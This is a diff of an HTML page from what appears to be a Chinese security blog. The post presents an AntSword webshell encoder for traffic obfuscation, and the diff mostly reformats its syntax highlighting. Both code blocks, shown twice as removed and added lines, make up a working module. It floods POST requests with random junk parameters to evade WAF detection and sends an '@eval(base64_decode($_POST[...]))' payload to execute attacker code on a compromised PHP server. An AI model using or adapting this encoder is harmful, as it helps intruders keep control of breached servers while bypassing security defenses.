@@ -10,13 +10,12 @@
     <title>蚁剑编码器之流量混淆 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="蚁剑编码器之流量混淆" />
 <meta property="og:description" content="1 前言模块很早就写好了，今天才有时间把文章写出来 大家都知道填充垃圾数据可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/ant-mass-bypass/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/ant-mass-bypass/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-11-09T16:59:18+00:00" />
 <meta property="article:modified_time" content="2019-11-09T16:59:18+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="蚁剑编码器之流量混淆"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="蚁剑编码器之流量混淆"/>
 <meta name="twitter:description" content="1 前言模块很早就写好了，今天才有时间把文章写出来 大家都知道填充垃圾数据可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -239,25 +238,25 @@
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">let varname_min = 5; //变量名最小长度
-</span></span><span class="line"><span class="cl">  let varname_max = 15; // 变量名最大长度
-</span></span><span class="line"><span class="cl">  let data_min = 200; // 变量值最小长度
-</span></span><span class="line"><span class="cl">  let data_max = 250; // 变量值最大长度
-</span></span><span class="line"><span class="cl">  let num_min = 150; // 变量最小个数
-</span></span><span class="line"><span class="cl">  let num_max = 250; // 变量最大个数
-</span></span><span class="line"><span class="cl">  function randomString(length) { // 生成随机字符串
-</span></span><span class="line"><span class="cl">    //let chars=&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let result = &#39;&#39;;
-</span></span><span class="line"><span class="cl">    for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
-</span></span><span class="line"><span class="cl">    return result;
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  function randomInt(min, max) {   //生成指定范围内的随机数
-</span></span><span class="line"><span class="cl">    return parseInt(Math.random() * (max - min + 1) + min, 10);
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  for (let i = 0; i &lt; randomInt(num_min, num_max); i++) {  //将混淆流量放入到payload数组中
-</span></span><span class="line"><span class="cl">    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
-</span></span><span class="line"><span class="cl">  }
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">let</span> <span class="n">varname_min</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span> <span class="o">//</span><span class="err">变量名最小长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">varname_max</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量名最大长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_min</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量值最小长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_max</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量值最大长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_min</span> <span class="o">=</span> <span class="mi">150</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量最小个数</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_max</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量最大个数</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomString</span><span class="p">(</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span> <span class="o">//</span> <span class="err">生成随机字符串</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">let</span> <span class="n">chars</span><span class="o">=</span><span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span><span class="p">)</span> <span class="n">result</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="n">chars</span><span class="o">.</span><span class="n">length</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomInt</span><span class="p">(</span><span class="nb">min</span><span class="p">,</span> <span class="nb">max</span><span class="p">)</span> <span class="p">{</span>   <span class="o">//</span><span class="err">生成指定范围内的随机数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="nb">max</span> <span class="o">-</span> <span class="nb">min</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nb">min</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">randomInt</span><span class="p">(</span><span class="n">num_min</span><span class="p">,</span> <span class="n">num_max</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>  <span class="o">//</span><span class="err">将混淆流量放入到</span><span class="n">payload数组中</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">varname_min</span><span class="p">,</span> <span class="n">varname_max</span><span class="p">))]</span> <span class="o">=</span> <span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">data_min</span><span class="p">,</span> <span class="n">data_max</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>那么怎么用呢</p>
@@ -296,36 +295,36 @@
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
-</span></span><span class="line"><span class="cl">/*
-</span></span><span class="line"><span class="cl">code by yzddMr6
-</span></span><span class="line"><span class="cl">*/
-</span></span><span class="line"><span class="cl">module.exports = (pwd, data, ext = {}) =&gt; {
-</span></span><span class="line"><span class="cl">  let varname_min = 5;
-</span></span><span class="line"><span class="cl">  let varname_max = 15;
-</span></span><span class="line"><span class="cl">  let data_min = 200;
-</span></span><span class="line"><span class="cl">  let data_max = 250;
-</span></span><span class="line"><span class="cl">  let num_min = 100;
-</span></span><span class="line"><span class="cl">  let num_max = 200;
-</span></span><span class="line"><span class="cl">  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
-</span></span><span class="line"><span class="cl">  data[randomID] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
-</span></span><span class="line"><span class="cl">  function randomString(length) {
-</span></span><span class="line"><span class="cl">    //let chars=&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let result = &#39;&#39;;
-</span></span><span class="line"><span class="cl">    for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
-</span></span><span class="line"><span class="cl">    return result;
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  function randomInt(min, max) {
-</span></span><span class="line"><span class="cl">    return parseInt(Math.random() * (max - min + 1) + min, 10);
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  for (let i = 0; i &lt; randomInt(num_min, num_max); i++) {
-</span></span><span class="line"><span class="cl">    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  data[pwd] = `@eval(base64_decode($_POST[${randomID}]));`;
-</span></span><span class="line"><span class="cl">  delete data[&#39;_&#39;];
-</span></span><span class="line"><span class="cl">  return data;
-</span></span><span class="line"><span class="cl">}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="n">by</span> <span class="n">yzddMr6</span>
+</span></span><span class="line"><span class="cl"><span class="o">*/</span>
+</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">ext</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">varname_min</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">varname_max</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_min</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_max</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_min</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_max</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">randomID</span> <span class="o">=</span> <span class="err">`</span><span class="n">_0x</span><span class="o">$</span><span class="p">{</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">)}</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">randomID</span><span class="p">]</span> <span class="o">=</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomString</span><span class="p">(</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">let</span> <span class="n">chars</span><span class="o">=</span><span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span><span class="p">)</span> <span class="n">result</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="n">chars</span><span class="o">.</span><span class="n">length</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomInt</span><span class="p">(</span><span class="nb">min</span><span class="p">,</span> <span class="nb">max</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="nb">max</span> <span class="o">-</span> <span class="nb">min</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nb">min</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">randomInt</span><span class="p">(</span><span class="n">num_min</span><span class="p">,</span> <span class="n">num_max</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">varname_min</span><span class="p">,</span> <span class="n">varname_max</span><span class="p">))]</span> <span class="o">=</span> <span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">data_min</span><span class="p">,</span> <span class="n">data_max</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]</span> <span class="o">=</span> <span class="err">`@</span><span class="n">eval</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="o">$</span><span class="p">{</span><span class="n">randomID</span><span class="p">}]));</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">delete</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="过云锁测试" class="headerLink">
@@ -591,7 +590,7 @@
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/">中国蚁剑</a>,&nbsp;<a href="/tags/bypass/">bypass</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/">中国蚁剑</a>,&nbsp;<a href="/tags/bypass/">Bypass</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
         </section>
